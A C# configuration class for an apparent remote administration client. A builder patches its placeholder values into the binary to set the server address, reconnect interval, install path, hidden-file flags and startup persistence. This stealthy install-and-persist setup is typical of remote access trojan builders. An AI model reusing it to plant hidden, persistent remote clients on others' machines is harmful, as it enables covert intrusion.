using System;
namespace RemoteAdmin.Client.Config
{
    /// <summary>
    /// Client configuration that gets modified at build time.
    /// The builder injects values by binary replacement of placeholders.
    /// </summary>
    public static class ClientConfig
    {
        // Connection Settings
        public static string ServerIP { get; private set; }
        public static int ServerPort { get; private set; }
        public static int ReconnectInterval { get; private set; }

        // Installation Settings
        public static bool InstallClient { get; private set; }
        public static string InstallLocation { get; private set; }
        public static string InstallSubDirectory { get; private set; }
        public static string InstallName { get; private set; }
        public static bool SetFileHidden { get; private set; }
        public static bool SetSubDirHidden { get; private set; }

        // Startup Settings
        public static bool InstallOnStartup { get; private set; }
        public static string StartupName { get; private set; }

        // Boolean placeholder fields - MUST BE STATIC (not const) to prevent compile-time optimization!
        private static int _boolInstallClientFlag = 0x11223344;
        private static int _boolSetFileHiddenFlag = 0x55667788;
        private static int _boolSetSubDirHiddenFlag = unchecked((int)0x99AABBCC);
        private static int _boolInstallOnStartupFlag = unchecked((int)0xDDEEFF00);

        // Static constructor - the builder will modify the binary
        static ClientConfig()
        {
            // Connection defaults (will be REPLACED by builder)
            // TrimEnd('\0') removes null padding from binary injection
            ServerIP = "###PLACEHOLDER_IP_ADDR_X9K2P7L4M###".TrimEnd('\0');
            ServerPort = 999999999;
            ReconnectInterval = 888888888;

            // Installation defaults (will be REPLACED by builder)
            InstallClient = (_boolInstallClientFlag == 1);
            InstallLocation = "###INSTALL_LOCATION_PLACEHOLDER###".TrimEnd('\0');
            InstallSubDirectory = "###INSTALL_SUBDIR_PLACEHOLDER###".TrimEnd('\0');
            InstallName = "###INSTALL_NAME_PLACEHOLDER###".TrimEnd('\0');
            SetFileHidden = (_boolSetFileHiddenFlag == 1);
            SetSubDirHidden = (_boolSetSubDirHiddenFlag == 1);

            // Startup defaults (will be REPLACED by builder)
            InstallOnStartup = (_boolInstallOnStartupFlag == 1);
            StartupName = "###STARTUP_NAME_PLACEHOLDER###".TrimEnd('\0');
        }

        public static void Initialize()
        {
            // Debug output
            Console.WriteLine("=== CLIENT CONFIGURATION ===");
            Console.WriteLine($"ServerIP: '{ServerIP}'");
            Console.WriteLine($"ServerPort: {ServerPort}");
            Console.WriteLine($"ReconnectInterval: {ReconnectInterval}");
            Console.WriteLine($"InstallClient: {InstallClient}");
            Console.WriteLine($"InstallLocation: '{InstallLocation}'");
            Console.WriteLine($"InstallSubDirectory: '{InstallSubDirectory}'");
            Console.WriteLine($"InstallName: '{InstallName}'");
            Console.WriteLine($"SetFileHidden: {SetFileHidden}");
            Console.WriteLine($"SetSubDirHidden: {SetSubDirHidden}");
            Console.WriteLine($"InstallOnStartup: {InstallOnStartup}");
            Console.WriteLine($"StartupName: '{StartupName}'");
            Console.WriteLine("============================");

            if (InstallClient)
            {
                Console.WriteLine($"Installation: Enabled to {InstallLocation}\\{InstallSubDirectory}\\{InstallName}.exe");
            }
            if (InstallOnStartup)
            {
                Console.WriteLine($"Startup: Enabled as '{StartupName}'");
            }
        }
    }
}